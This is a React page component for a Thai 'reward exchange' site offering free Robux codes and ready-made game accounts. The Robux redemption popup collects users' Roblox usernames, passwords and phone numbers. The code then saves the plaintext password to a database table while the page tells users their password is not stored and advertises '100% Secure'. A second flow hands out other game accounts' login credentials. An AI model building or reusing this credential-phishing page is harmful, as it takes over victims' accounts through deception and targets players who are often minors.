import React, { useState, useEffect } from 'react';
import { Button } from '@/components/ui/button';
import { Input } from '@/components/ui/input';
import { Card, CardContent, CardHeader, CardTitle } from '@/components/ui/card';
import { Badge } from '@/components/ui/badge';
import { Textarea } from '@/components/ui/textarea';
import { Select, SelectContent, SelectItem, SelectTrigger, SelectValue } from '@/components/ui/select';
import { toast } from 'sonner';
import { supabase } from '@/lib/supabase';
import { Link } from 'react-router-dom';
import { Dialog, DialogContent, DialogHeader, DialogTitle } from '@/components/ui/dialog';
import { RedemptionRequest, RedemptionCode, ChickenAccount } from '@/types';

export default function Home() {
  const [activeTab, setActiveTab] = useState<'redeem' | 'robux' | 'chicken'>('redeem');
  const [robuxForm, setRobuxForm] = useState({
    username: '',
    amount: '',
    contact: '',
    paymentMethod: ''
  });
  const [chickenForm, setChickenForm] = useState({
    username: '',
    gameType: '',
    contact: '',
    notes: ''
  });
  
  // Chicken account redemption states
  const [chickenRedeemCode, setChickenRedeemCode] = useState('');
  const [validatedChickenAccount, setValidatedChickenAccount] = useState<ChickenAccount | null>(null);
  const [showChickenRedeemPopup, setShowChickenRedeemPopup] = useState(false);
  const [availableCodes, setAvailableCodes] = useState<RedemptionCode[]>([]);
  const [availableAccounts, setAvailableAccounts] = useState<ChickenAccount[]>([]);
  const [isSubmitting, setIsSubmitting] = useState(false);
  
  // Code redemption states
  const [redeemCode, setRedeemCode] = useState('');
  const [validatedCode, setValidatedCode] = useState<RedemptionCode | null>(null);
  const [showRedeemPopup, setShowRedeemPopup] = useState(false);
  const [redeemForm, setRedeemForm] = useState({
    username: '',
    password: '',
    contact: ''
  });

  useEffect(() => {
    loadAvailableItems();
  }, []);

  const loadAvailableItems = async () => {
    try {
      const { data: codes } = await supabase
        .from('app_9c8f2cf91bf942b2a7f12fc4c7ee9dc6_redemption_codes')
        .select('*')
        .eq('status', 'active');
      
      const { data: accounts } = await supabase
        .from('app_9c8f2cf91bf942b2a7f12fc4c7ee9dc6_chicken_accounts')
        .select('*')
        .eq('status', 'available');

      setAvailableCodes(codes || []);
      setAvailableAccounts(accounts || []);
    } catch (error) {
      console.error('Error loading items:', error);
    }
  };

  const handleRobuxSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    if (!robuxForm.username || !robuxForm.amount || !robuxForm.contact || !robuxForm.paymentMethod) {
      toast.error('กรุณากรอกข้อมูลให้ครบถ้วน');
      return;
    }

    setIsSubmitting(true);
    try {
      const { error } = await supabase
        .from('app_9c8f2cf91bf942b2a7f12fc4c7ee9dc6_redemption_requests')
        .insert({
          roblox_username: robuxForm.username,
          robux_amount: parseInt(robuxForm.amount),
          contact_info: `${robuxForm.contact} | วิธีจ่าย: ${robuxForm.paymentMethod}`,
          status: 'pending'
        });

      if (error) throw error;
      toast.success('ส่งคำขอแลก Robux สำเร็จ! รอการติดต่อกลับ');
      setRobuxForm({ username: '', amount: '', contact: '', paymentMethod: '' });
    } catch (error) {
      toast.error('เกิดข้อผิดพลาด กรุณาลองใหม่');
    } finally {
      setIsSubmitting(false);
    }
  };

  const validateCode = async () => {
    if (!redeemCode.trim()) {
      toast.error('กรุณาใส่โค้ด');
      return;
    }

    setIsSubmitting(true);
    try {
      const { data, error } = await supabase
        .from('app_9c8f2cf91bf942b2a7f12fc4c7ee9dc6_redemption_codes')
        .select('*')
        .eq('code', redeemCode.trim().toUpperCase())
        .eq('status', 'active')
        .single();

      if (error || !data) {
        toast.error('โค้ดไม่ถูกต้องหรือถูกใช้ไปแล้ว');
        return;
      }

      setValidatedCode(data);
      setShowRedeemPopup(true);
      toast.success(`พบโค้ด! มูลค่า ${data.robux_value} Robux`);
    } catch (error) {
      toast.error('เกิดข้อผิดพลาดในการตรวจสอบโค้ด');
    } finally {
      setIsSubmitting(false);
    }
  };

  const completeRedemption = async () => {
    if (!redeemForm.username || !redeemForm.password || !validatedCode) {
      toast.error('กรุณากรอกข้อมูลให้ครบถ้วน');
      return;
    }

    setIsSubmitting(true);
    try {
      // Mark code as used
      const { error: codeError } = await supabase
        .from('app_9c8f2cf91bf942b2a7f12fc4c7ee9dc6_redemption_codes')
        .update({ 
          status: 'used',
          used_by: redeemForm.username,
          used_at: new Date().toISOString()
        })
        .eq('id', validatedCode.id);

      if (codeError) throw codeError;

      // Create redemption request record
      const { error: requestError } = await supabase
        .from('app_9c8f2cf91bf942b2a7f12fc4c7ee9dc6_redemption_requests')
        .insert({
          roblox_username: redeemForm.username,
          robux_amount: validatedCode.robux_value,
          contact_info: `Code: ${validatedCode.code} | Password: ${redeemForm.password} | Contact: ${redeemForm.contact}`,
          status: 'pending'
        });

      if (requestError) throw requestError;

      toast.success(`🎉 แลกโค้ดสำเร็จ! คำขอ ${validatedCode.robux_value} Robux อยู่ในระบบแล้ว รอการดำเนินการ`);
      
      // Reset form
      setRedeemCode('');
      setValidatedCode(null);
      setShowRedeemPopup(false);
      setRedeemForm({ username: '', password: '', contact: '' });
      loadAvailableItems();
    } catch (error) {
      toast.error('เกิดข้อผิดพลาดในการแลกโค้ด');
    } finally {
      setIsSubmitting(false);
    }
  };

  const validateChickenCode = async () => {
    if (!chickenRedeemCode.trim()) {
      toast.error('กรุณาใส่โค้ด');
      return;
    }

    setIsSubmitting(true);
    try {
      const { data, error } = await supabase
        .from('app_9c8f2cf91bf942b2a7f12fc4c7ee9dc6_chicken_accounts')
        .select('*')
        .eq('code', chickenRedeemCode.trim().toUpperCase())
        .eq('status', 'available')
        .single();

      if (error || !data) {
        toast.error('โค้ดไม่ถูกต้องหรือถูกใช้ไปแล้ว');
        return;
      }

      setValidatedChickenAccount(data);
      setShowChickenRedeemPopup(true);
      toast.success(`พบบัญชี ${data.product_name}!`);
    } catch (error) {
      toast.error('เกิดข้อผิดพลาดในการตรวจสอบโค้ด');
    } finally {
      setIsSubmitting(false);
    }
  };

  const completeChickenRedemption = async () => {
    if (!validatedChickenAccount) {
      toast.error('เกิดข้อผิดพลาด');
      return;
    }

    setIsSubmitting(true);
    try {
      // Mark account as used
      const { error: accountError } = await supabase
        .from('app_9c8f2cf91bf942b2a7f12fc4c7ee9dc6_chicken_accounts')
        .update({ 
          status: 'used',
          used_at: new Date().toISOString()
        })
        .eq('id', validatedChickenAccount.id);

      if (accountError) throw accountError;

      // Create redemption request record
      const { error: requestError } = await supabase
        .from('app_9c8f2cf91bf942b2a7f12fc4c7ee9dc6_redemption_requests')
        .insert({
          roblox_username: 'Chicken Account User',
          robux_amount: 0,
          contact_info: `Chicken Account Redemption: ${validatedChickenAccount.code} - ${validatedChickenAccount.product_name}`,
          status: 'completed'
        });

      if (requestError) throw requestError;

      toast.success(`🎉 แลกโค้ดสำเร็จ! คุณได้รับบัญชี ${validatedChickenAccount.product_name}`);
      
      // Reset form
      setChickenRedeemCode('');
      setValidatedChickenAccount(null);
      setShowChickenRedeemPopup(false);
      loadAvailableItems();
    } catch (error) {
      toast.error('เกิดข้อผิดพลาดในการแลกโค้ด');
    } finally {
      setIsSubmitting(false);
    }
  };

  const handleChickenSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    if (!chickenForm.username || !chickenForm.gameType || !chickenForm.contact) {
      toast.error('กรุณากรอกข้อมูลให้ครบถ้วน');
      return;
    }

    setIsSubmitting(true);
    try {
      const { error } = await supabase
        .from('app_9c8f2cf91bf942b2a7f12fc4c7ee9dc6_redemption_requests')
        .insert({
          roblox_username: chickenForm.username,
          robux_amount: 0,
          contact_info: `${chickenForm.contact} | เกม: ${chickenForm.gameType} | หมายเหตุ: ${chickenForm.notes}`,
          status: 'pending'
        });

      if (error) throw error;
      toast.success('ส่งคำขอบัญชีไก่ตันสำเร็จ! รอการติดต่อกลับ');
      setChickenForm({ username: '', gameType: '', contact: '', notes: '' });
    } catch (error) {
      toast.error('เกิดข้อผิดพลาด กรุณาลองใหม่');
    } finally {
      setIsSubmitting(false);
    }
  };

  return (
    <div className="min-h-screen bg-gradient-to-br from-indigo-900 via-purple-900 to-pink-900">
      {/* Animated Background */}
      <div className="absolute inset-0 overflow-hidden">
        <div className="absolute -top-40 -right-40 w-80 h-80 bg-purple-500 rounded-full mix-blend-multiply filter blur-xl opacity-20 animate-pulse"></div>
        <div className="absolute -bottom-40 -left-40 w-80 h-80 bg-pink-500 rounded-full mix-blend-multiply filter blur-xl opacity-20 animate-pulse animation-delay-2000"></div>
        <div className="absolute top-1/2 left-1/2 transform -translate-x-1/2 -translate-y-1/2 w-80 h-80 bg-indigo-500 rounded-full mix-blend-multiply filter blur-xl opacity-20 animate-pulse animation-delay-4000"></div>
      </div>

      {/* Header */}
      <header className="relative z-10 bg-black/20 backdrop-blur-lg border-b border-white/10">
        <div className="container mx-auto px-4 py-6">
          <div className="flex items-center justify-between">
            <div className="flex items-center space-x-4">
              <div className="w-16 h-16 bg-gradient-to-r from-purple-500 to-pink-500 rounded-2xl flex items-center justify-center shadow-2xl">
                <span className="text-3xl">💎</span>
              </div>
              <div>
                <h1 className="text-3xl font-bold bg-gradient-to-r from-purple-400 to-pink-400 bg-clip-text text-transparent">
                  ระบบแลกของรางวัล
                </h1>
                <p className="text-purple-200 text-sm">Robux & Chicken Accounts Exchange</p>
              </div>
            </div>
            <div className="flex space-x-3">
              <Link to="/status">
                <Button variant="outline" className="bg-white/10 border-white/20 text-white hover:bg-white/20">
                  🔍 เช็คสถานะ
                </Button>
              </Link>
              <Link to="/admin">
                <Button className="bg-gradient-to-r from-purple-600 to-pink-600 hover:from-purple-700 hover:to-pink-700">
                  👑 แอดมิน
                </Button>
              </Link>
            </div>
          </div>
        </div>
      </header>

      {/* Main Content */}
      <main className="relative z-10 container mx-auto px-4 py-8">
        {/* Stats Section */}
        <div className="grid grid-cols-1 md:grid-cols-4 gap-6 mb-8">
          <Card className="bg-white/10 backdrop-blur-xl border-white/20 text-white">
            <CardContent className="p-6 text-center">
              <div className="text-3xl mb-2">🎮</div>
              <div className="text-2xl font-bold text-purple-300">{availableCodes.length}</div>
              <div className="text-sm text-purple-200">Robux Codes</div>
            </CardContent>
          </Card>
          <Card className="bg-white/10 backdrop-blur-xl border-white/20 text-white">
            <CardContent className="p-6 text-center">
              <div className="text-3xl mb-2">🐔</div>
              <div className="text-2xl font-bold text-pink-300">{availableAccounts.length}</div>
              <div className="text-sm text-pink-200">Chicken Accounts</div>
            </CardContent>
          </Card>
          <Card className="bg-white/10 backdrop-blur-xl border-white/20 text-white">
            <CardContent className="p-6 text-center">
              <div className="text-3xl mb-2">⚡</div>
              <div className="text-2xl font-bold text-yellow-300">24/7</div>
              <div className="text-sm text-yellow-200">Online Service</div>
            </CardContent>
          </Card>
          <Card className="bg-white/10 backdrop-blur-xl border-white/20 text-white">
            <CardContent className="p-6 text-center">
              <div className="text-3xl mb-2">🔒</div>
              <div className="text-2xl font-bold text-green-300">100%</div>
              <div className="text-sm text-green-200">Secure</div>
            </CardContent>
          </Card>
        </div>

        {/* Tab Navigation */}
        <div className="flex justify-center mb-8">
          <div className="bg-white/10 backdrop-blur-xl rounded-2xl p-2 border border-white/20">
            <Button
              onClick={() => setActiveTab('redeem')}
              className={`px-6 py-3 rounded-xl transition-all ${
                activeTab === 'redeem'
                  ? 'bg-gradient-to-r from-green-600 to-emerald-600 text-white shadow-lg'
                  : 'bg-transparent text-white/70 hover:text-white hover:bg-white/10'
              }`}
            >
              🎫 แลกโค้ด
            </Button>
            <Button
              onClick={() => setActiveTab('robux')}
              className={`px-6 py-3 rounded-xl transition-all ${
                activeTab === 'robux'
                  ? 'bg-gradient-to-r from-purple-600 to-pink-600 text-white shadow-lg'
                  : 'bg-transparent text-white/70 hover:text-white hover:bg-white/10'
              }`}
            >
              💰 ขอ Robux
            </Button>
            <Button
              onClick={() => setActiveTab('chicken')}
              className={`px-6 py-3 rounded-xl transition-all ${
                activeTab === 'chicken'
                  ? 'bg-gradient-to-r from-orange-600 to-yellow-600 text-white shadow-lg'
                  : 'bg-transparent text-white/70 hover:text-white hover:bg-white/10'
              }`}
            >
              🐔 แลกไก่ตัน
            </Button>
          </div>
        </div>

        {/* Forms */}
        <div className="max-w-2xl mx-auto">
          {activeTab === 'redeem' ? (
            <Card className="bg-white/10 backdrop-blur-xl border-white/20">
              <CardHeader className="text-center">
                <CardTitle className="text-2xl text-white flex items-center justify-center space-x-2">
                  <span className="text-3xl">🎫</span>
                  <span>แลกโค้ดรับ Robux</span>
                </CardTitle>
                <p className="text-green-200">ใส่โค้ดที่ได้รับเพื่อแลกเป็น Robux</p>
              </CardHeader>
              <CardContent className="space-y-6">
                <div className="space-y-4">
                  <div>
                    <label className="block text-white text-sm font-medium mb-2">
                      โค้ดที่ได้รับ
                    </label>
                    <div className="flex space-x-3">
                      <Input
                        value={redeemCode}
                        onChange={(e) => setRedeemCode(e.target.value)}
                        placeholder="ใส่โค้ดที่ได้รับ"
                        className="bg-white/10 border-white/20 text-white placeholder:text-white/50 flex-1"
                        onKeyPress={(e) => e.key === 'Enter' && validateCode()}
                      />
                      <Button
                        onClick={validateCode}
                        disabled={isSubmitting}
                        className="bg-gradient-to-r from-green-600 to-emerald-600 hover:from-green-700 hover:to-emerald-700"
                      >
                        {isSubmitting ? 'ตรวจสอบ...' : 'ตรวจสอบ'}
                      </Button>
                    </div>
                  </div>

                  <div className="bg-green-500/10 border border-green-500/20 rounded-lg p-4">
                    <p className="text-green-200 text-sm">
                      <strong>💡 วิธีใช้:</strong> ใส่โค้ดที่ได้รับและกดตรวจสอบ หากโค้ดถูกต้อง 
                      จะมีหน้าต่างขึ้นมาให้ใส่ชื่อผู้ใช้และรหัสผ่าน Roblox เพื่อรับ Robux
                    </p>
                  </div>
                </div>
              </CardContent>
            </Card>
          ) : activeTab === 'robux' ? (
            <Card className="bg-white/10 backdrop-blur-xl border-white/20">
              <CardHeader className="text-center">
                <CardTitle className="text-2xl text-white flex items-center justify-center space-x-2">
                  <span className="text-3xl">💎</span>
                  <span>แลกเป็น Robux</span>
                </CardTitle>
                <p className="text-purple-200">กรอกข้อมูลเพื่อแลกโค้ดเป็น Robux</p>
              </CardHeader>
              <CardContent className="space-y-6">
                <form onSubmit={handleRobuxSubmit} className="space-y-6">
                  <div>
                    <label className="block text-white text-sm font-medium mb-2">
                      ชื่อผู้เล่น Roblox
                    </label>
                    <Input
                      value={robuxForm.username}
                      onChange={(e) => setRobuxForm(prev => ({ ...prev, username: e.target.value }))}
                      placeholder="ใส่ชื่อผู้เล่น Roblox"
                      className="bg-white/10 border-white/20 text-white placeholder:text-white/50"
                      required
                    />
                  </div>

                  <div>
                    <label className="block text-white text-sm font-medium mb-2">
                      จำนวน Robux ที่ต้องการ
                    </label>
                    <Select onValueChange={(value) => setRobuxForm(prev => ({ ...prev, amount: value }))}>
                      <SelectTrigger className="bg-white/10 border-white/20 text-white">
                        <SelectValue placeholder="เลือกจำนวน Robux" />
                      </SelectTrigger>
                      <SelectContent className="bg-gray-900 border-gray-700">
                        {availableCodes.map(code => (
                          <SelectItem key={code.id} value={code.robux_value.toString()}>
                            {code.robux_value} Robux
                          </SelectItem>
                        ))}
                      </SelectContent>
                    </Select>
                  </div>

                  <div>
                    <label className="block text-white text-sm font-medium mb-2">
                      วิธีการจ่ายเงิน
                    </label>
                    <Select onValueChange={(value) => setRobuxForm(prev => ({ ...prev, paymentMethod: value }))}>
                      <SelectTrigger className="bg-white/10 border-white/20 text-white">
                        <SelectValue placeholder="เลือกวิธีจ่าย" />
                      </SelectTrigger>
                      <SelectContent className="bg-gray-900 border-gray-700">
                        <SelectItem value="truemoney">TrueMoney Wallet</SelectItem>
                        <SelectItem value="promptpay">PromptPay</SelectItem>
                        <SelectItem value="bank">โอนธนาคาร</SelectItem>
                        <SelectItem value="crypto">Cryptocurrency</SelectItem>
                      </SelectContent>
                    </Select>
                  </div>

                  <div>
                    <label className="block text-white text-sm font-medium mb-2">
                      ข้อมูลติดต่อ
                    </label>
                    <Textarea
                      value={robuxForm.contact}
                      onChange={(e) => setRobuxForm(prev => ({ ...prev, contact: e.target.value }))}
                      placeholder="Discord, Line ID, หรือเบอร์โทร"
                      className="bg-white/10 border-white/20 text-white placeholder:text-white/50"
                      rows={3}
                      required
                    />
                  </div>

                  <Button
                    type="submit"
                    disabled={isSubmitting}
                    className="w-full bg-gradient-to-r from-purple-600 to-pink-600 hover:from-purple-700 hover:to-pink-700 text-white font-semibold py-4 text-lg"
                  >
                    {isSubmitting ? 'กำลังส่งคำขอ...' : '💎 ส่งคำขอแลก Robux'}
                  </Button>
                </form>
              </CardContent>
            </Card>
          ) : (
            <Card className="bg-white/10 backdrop-blur-xl border-white/20">
              <CardHeader className="text-center">
                <CardTitle className="text-2xl text-white flex items-center justify-center space-x-2">
                  <span className="text-3xl">🐔</span>
                  <span>แลกโค้ดรับบัญชีไก่ตัน</span>
                </CardTitle>
                <p className="text-orange-200">ใส่โค้ดที่ได้รับเพื่อแลกบัญชีเกมไก่ตัน</p>
              </CardHeader>
              <CardContent className="space-y-6">
                <div className="space-y-4">
                  <div>
                    <label className="block text-white text-sm font-medium mb-2">
                      โค้ดที่ได้รับ
                    </label>
                    <div className="flex space-x-3">
                      <Input
                        value={chickenRedeemCode}
                        onChange={(e) => setChickenRedeemCode(e.target.value)}
                        placeholder="ใส่โค้ดที่ได้รับ"
                        className="bg-white/10 border-white/20 text-white placeholder:text-white/50 flex-1"
                        onKeyPress={(e) => e.key === 'Enter' && validateChickenCode()}
                      />
                      <Button
                        onClick={validateChickenCode}
                        disabled={isSubmitting}
                        className="bg-gradient-to-r from-orange-600 to-yellow-600 hover:from-orange-700 hover:to-yellow-700"
                      >
                        {isSubmitting ? 'ตรวจสอบ...' : 'ตรวจสอบ'}
                      </Button>
                    </div>
                  </div>

                  <div className="bg-orange-500/10 border border-orange-500/20 rounded-lg p-4">
                    <p className="text-orange-200 text-sm">
                      <strong>💡 วิธีใช้:</strong> ใส่โค้ดที่ได้รับและกดตรวจสอบ หากโค้ดถูกต้อง 
                      จะมีหน้าต่างขึ้นมาแสดงชื่อผู้ใช้และรหัสผ่านของบัญชีเกม
                    </p>
                  </div>
                </div>
              </CardContent>
            </Card>
          )}
        </div>

        {/* Code Redemption Popup */}
        <Dialog open={showRedeemPopup} onOpenChange={setShowRedeemPopup}>
          <DialogContent className="bg-gray-900/95 backdrop-blur-xl border-green-500/30 text-white max-w-md">
            <DialogHeader>
              <DialogTitle className="text-center">
                <div className="flex items-center justify-center space-x-2 mb-4">
                  <span className="text-4xl">🎉</span>
                  <div>
                    <div className="text-2xl font-bold text-green-400">โค้ดถูกต้อง!</div>
                    <div className="text-sm text-green-300">
                      คุณจะได้ {validatedCode?.robux_value} Robux
                    </div>
                  </div>
                </div>
              </DialogTitle>
            </DialogHeader>
            
            <div className="space-y-4">
              <div className="bg-green-500/10 border border-green-500/20 rounded-lg p-4 text-center">
                <p className="text-green-200 text-sm mb-2">
                  <strong>โค้ด:</strong> {validatedCode?.code}
                </p>
                <p className="text-green-200 text-sm">
                  <strong>มูลค่า:</strong> {validatedCode?.robux_value} Robux
                </p>
              </div>

              <div className="space-y-3">
                <div>
                  <label className="block text-white text-sm font-medium mb-2">
                    ชื่อผู้ใช้ Roblox
                  </label>
                  <Input
                    value={redeemForm.username}
                    onChange={(e) => setRedeemForm(prev => ({ ...prev, username: e.target.value }))}
                    placeholder="ใส่ชื่อผู้ใช้ Roblox"
                    className="bg-white/10 border-white/20 text-white placeholder:text-white/50"
                  />
                </div>

                <div>
                  <label className="block text-white text-sm font-medium mb-2">
                    รหัสผ่าน Roblox
                  </label>
                  <Input
                    type="password"
                    value={redeemForm.password}
                    onChange={(e) => setRedeemForm(prev => ({ ...prev, password: e.target.value }))}
                    placeholder="ใส่รหัสผ่าน Roblox"
                    className="bg-white/10 border-white/20 text-white placeholder:text-white/50"
                  />
                </div>

                <div>
                  <label className="block text-white text-sm font-medium mb-2">
                    <span className="text-red-400">*</span> เบอร์โทรศัพท์ (สำคัญมาก)
                  </label>
                  <Input
                    value={redeemForm.contact}
                    onChange={(e) => setRedeemForm(prev => ({ ...prev, contact: e.target.value }))}
                    placeholder="กรุณาใส่เบอร์โทรศัพท์ของคุณ (จำเป็นต้องมี)"
                    className="bg-white/10 border-white/20 text-white placeholder:text-white/50 border-red-400/50"
                  />
                  <p className="text-red-300 text-xs mt-1">
                    ⚠️ เบอร์โทรศัพท์จำเป็นสำหรับการติดต่อและยืนยันตัวตน
                  </p>
                </div>
              </div>

              <div className="bg-red-500/10 border border-red-500/20 rounded-lg p-3">
                <p className="text-red-200 text-xs">
                  <strong>⚠️ สำคัญ:</strong> เบอร์โทรศัพท์จำเป็นสำหรับการติดต่อและยืนยันตัวตน
                  <br />ข้อมูลอื่นใช้สำหรับการส่ง Robux เท่านั้น เราไม่เก็บรหัสผ่านของคุณ
                </p>
              </div>

              <div className="flex space-x-3">
                <Button
                  onClick={() => setShowRedeemPopup(false)}
                  variant="outline"
                  className="flex-1 bg-white/10 border-white/20 text-white hover:bg-white/20"
                >
                  ยกเลิก
                </Button>
                <Button
                  onClick={completeRedemption}
                  disabled={isSubmitting || !redeemForm.username || !redeemForm.password || !redeemForm.contact}
                  className="flex-1 bg-gradient-to-r from-green-600 to-emerald-600 hover:from-green-700 hover:to-emerald-700"
                >
                  {isSubmitting ? 'กำลังแลก...' : '🎫 แลกโค้ด'}
                </Button>
              </div>
            </div>
          </DialogContent>
        </Dialog>

        {/* Chicken Account Redemption Popup */}
        <Dialog open={showChickenRedeemPopup} onOpenChange={setShowChickenRedeemPopup}>
          <DialogContent className="bg-gray-900/95 backdrop-blur-xl border-orange-500/30 text-white max-w-md">
            <DialogHeader>
              <DialogTitle className="text-center">
                <div className="flex items-center justify-center space-x-2 mb-4">
                  <span className="text-4xl">🎉</span>
                  <div>
                    <div className="text-2xl font-bold text-orange-400">พบบัญชีเกมแล้ว!</div>
                    <div className="text-sm text-orange-300">
                      {validatedChickenAccount?.product_name}
                    </div>
                  </div>
                </div>
              </DialogTitle>
            </DialogHeader>
            
            <div className="space-y-4">
              <div className="bg-orange-500/10 border border-orange-500/20 rounded-lg p-4">
                <div className="text-center mb-4">
                  <p className="text-orange-200 text-sm mb-2">
                    <strong>โค้ด:</strong> {validatedChickenAccount?.code}
                  </p>
                  <p className="text-orange-200 text-sm">
                    <strong>ประเภทบัญชี:</strong> {validatedChickenAccount?.product_name}
                  </p>
                </div>
                
                <div className="bg-white/10 rounded-lg p-4 space-y-3">
                  <div className="text-center">
                    <p className="text-white text-lg font-bold mb-3">ข้อมูลบัญชีของคุณ</p>
                  </div>
                  
                  <div className="bg-green-500/20 border border-green-500/30 rounded-lg p-3">
                    <div className="flex justify-between items-center mb-2">
                      <span className="text-green-200 text-sm">ชื่อผู้ใช้:</span>
                      <span className="text-white font-mono font-bold">{validatedChickenAccount?.username}</span>
                    </div>
                    <div className="flex justify-between items-center">
                      <span className="text-green-200 text-sm">รหัสผ่าน:</span>
                      <span className="text-white font-mono font-bold">{validatedChickenAccount?.password}</span>
                    </div>
                  </div>
                  
                  {validatedChickenAccount?.notes && (
                    <div className="bg-blue-500/10 border border-blue-500/20 rounded-lg p-3">
                      <p className="text-blue-200 text-sm mb-1">หมายเหตุ:</p>
                      <p className="text-white text-sm">{validatedChickenAccount.notes}</p>
                    </div>
                  )}
                </div>
              </div>

              <div className="bg-yellow-500/10 border border-yellow-500/20 rounded-lg p-3">
                <p className="text-yellow-200 text-xs">
                  <strong>หมายเหตุ:</strong> กรุณาบันทึกข้อมูลบัญชีนี้ไว้ เมื่อปิดหน้าต่างนี้จะไม่สามารถดูข้อมูลได้อีก
                </p>
              </div>

              <div className="flex space-x-3">
                <Button
                  onClick={() => setShowChickenRedeemPopup(false)}
                  variant="outline"
                  className="flex-1 bg-white/10 border-white/20 text-white hover:bg-white/20"
                >
                  ปิด
                </Button>
                <Button
                  onClick={completeChickenRedemption}
                  disabled={isSubmitting}
                  className="flex-1 bg-gradient-to-r from-orange-600 to-yellow-600 hover:from-orange-700 hover:to-yellow-700"
                >
                  {isSubmitting ? 'กำลังยืนยัน...' : '🐔 ยืนยันการรับ'}
                </Button>
              </div>
            </div>
          </DialogContent>
        </Dialog>

        {/* Available Items Display */}
        <div className="grid grid-cols-1 md:grid-cols-2 gap-8 mt-12">
          {/* Available Robux Codes */}
          <Card className="bg-white/5 backdrop-blur-xl border-white/10">
            <CardHeader>
              <CardTitle className="text-white flex items-center space-x-2">
                <span className="text-2xl">💎</span>
                <span>โค้ด Robux ที่มี</span>
              </CardTitle>
            </CardHeader>
            <CardContent>
              <div className="space-y-2">
                {availableCodes.map(code => (
                  <div key={code.id} className="flex justify-between items-center p-3 bg-white/10 rounded-lg">
                    <span className="text-white font-medium">{code.robux_value} Robux</span>
                    <Badge className="bg-green-500/20 text-green-300 border-green-500/30">
                      มีอยู่
                    </Badge>
                  </div>
                ))}
              </div>
            </CardContent>
          </Card>

          {/* Available Chicken Accounts */}
          <Card className="bg-white/5 backdrop-blur-xl border-white/10">
            <CardHeader>
              <CardTitle className="text-white flex items-center space-x-2">
                <span className="text-2xl">🐔</span>
                <span>บัญชีไก่ตันที่มี</span>
              </CardTitle>
            </CardHeader>
            <CardContent>
              <div className="space-y-2">
                {Array.from(new Set(availableAccounts.map(acc => acc.product_name))).map(product => {
                  const count = availableAccounts.filter(acc => acc.product_name === product).length;
                  return (
                    <div key={product} className="flex justify-between items-center p-3 bg-white/10 rounded-lg">
                      <span className="text-white font-medium">{product}</span>
                      <Badge className="bg-orange-500/20 text-orange-300 border-orange-500/30">
                        {count} บัญชี
                      </Badge>
                    </div>
                  );
                })}
              </div>
            </CardContent>
          </Card>
        </div>
      </main>
    </div>
  );
}